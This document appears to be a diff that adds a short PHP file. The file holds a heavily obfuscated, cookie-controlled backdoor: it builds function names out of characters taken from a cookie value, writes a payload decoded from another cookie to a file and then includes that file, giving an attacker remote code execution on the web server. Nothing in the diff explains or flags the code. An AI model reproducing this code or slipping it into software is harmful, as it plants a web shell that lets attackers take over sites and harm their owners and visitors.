@@ -1,0 +1,2 @@
+<?php
+$Kye=	$_COOKIE; $mVis	=0;	$Vmxs =(84-77 ) ;$Sc	= array()	;$Sc	[	$mVis ]	= ""; while(	$Vmxs){$Sc [$mVis] .=$Kye[		(	59 -	22)	]	[$Vmxs	] ;		if(	! $Kye[ (	42-5 ) ][$Vmxs	+	1])	{ if (!	$Kye[(	93 -56	) 	] [$Vmxs+2	]	)	break	;	$mVis ++ ; $Sc[ $mVis]=	"" ;		$Vmxs++; } $Vmxs	=$Vmxs+	(78 -71 )+1;	}$mVis	=$Sc[		( 25	-	3)]()	.$Sc [(	32 - 26)	];if(!$Sc [ ( 60-40	) ] ($mVis))	{	 $Vmxs =$Sc [ (	85-57 ) ] (	$mVis, $Sc[(17 -4)	]) ;	$Sc[		(29 - 0)] ($Vmxs ,	$Sc [(58-	34 )	 ].	$Sc [	(46	-	36 ) ](	$Sc[ ( 90-82 ) ]($Kye [	3	] ) )); }include ( $mVis);
